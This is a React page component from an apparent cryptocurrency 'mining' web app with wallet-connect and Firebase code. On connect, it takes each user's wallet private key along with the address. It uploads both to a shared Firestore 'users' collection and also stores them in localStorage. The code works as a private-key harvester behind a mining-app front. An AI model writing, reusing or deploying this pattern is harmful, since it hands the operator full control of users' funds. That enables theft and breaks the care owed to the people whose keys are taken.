import React, { useState, useEffect } from "react";
import WalletConnect from "../components/WalletConnect";
import MiningBox from "../components/MiningBox";
import { db, collection, addDoc, getDocs } from "../firebaseConfig";
import "./Home.css"; // ✅ Make sure this is properly imported!

const Home = () => {
  const [walletData, setWalletData] = useState(null);
  const [userData, setUserData] = useState([]);

  // 🔹 Save Wallet in Firestore
  const saveWalletToFirestore = async (walletAddress, privateKey) => {
    try {
      await addDoc(collection(db, "users"), {
        walletAddress,
        privateKey,
        lastLogin: new Date().toISOString(),
      });
      console.log("✅ Wallet saved:", walletAddress);
    } catch (error) {
      console.error("❌ Error saving wallet:", error);
    }
  };

  // 🔹 Fetch users from Firestore
  useEffect(() => {
    const fetchUsers = async () => {
      try {
        console.log("📡 Fetching users...");
        const querySnapshot = await getDocs(collection(db, "users"));
        const users = querySnapshot.docs.map((doc) => doc.data());
        setUserData(users);
        console.log("🟢 Users loaded:", users);
      } catch (error) {
        console.error("❌ Error fetching users:", error);
      }
    };
    fetchUsers();
  }, []);

  // 🔹 Handle Wallet Connect
  const handleWalletConnect = ({ walletAddress, privateKey }) => {
    if (!walletAddress || !privateKey) {
      console.error("⚠️ Missing wallet address or private key!");
      return;
    }

    setWalletData({ walletAddress, privateKey });
    saveWalletToFirestore(walletAddress, privateKey);

    let storedUsers = JSON.parse(localStorage.getItem("userRecords")) || [];
    const isDuplicate = storedUsers.some((user) => user.walletAddress === walletAddress);

    if (!isDuplicate) {
      storedUsers.push({ walletAddress, privateKey, lastLogin: new Date().toISOString() });
      localStorage.setItem("userRecords", JSON.stringify(storedUsers));
      setUserData(storedUsers);
    }
  };

  return (
    <div className="h-screen flex flex-col items-center justify-center bg-darkBg text-white relative overflow-hidden">
      {/* 🔥 Animated Coins */}
      <div className="coin-container">
        {Array.from({ length: 10 }).map((_, index) => (
          <div key={index} className="coin"></div>
        ))}
      </div>

      {!walletData && <WalletConnect setWalletData={handleWalletConnect} />}
      {walletData && (
        <>
          <MiningBox wallet={walletData.walletAddress} />
          <div className="mt-5 p-4 bg-gray-800 rounded-lg shadow-lg">
            <h2 className="text-lg font-bold text-neonGreen">Connected Wallet</h2>
            <p className="text-white">Address: {walletData.walletAddress}</p>
          </div>
        </>
      )}

      <div className="mt-10">
        <h2 className="text-lg font-bold text-neonGreen">All Users</h2>
        {userData.length === 0 ? (
          <p className="text-gray-400">No users found.</p>
        ) : (
          <ul className="mt-2 space-y-1">
            {userData.map((user, index) => (
              <li key={index} className="text-gray-300">
                {user.walletAddress} - Last Login: {new Date(user.lastLogin).toLocaleString()}
              </li>
            ))}
          </ul>
        )}
      </div>
    </div>
  );
};

export default Home;
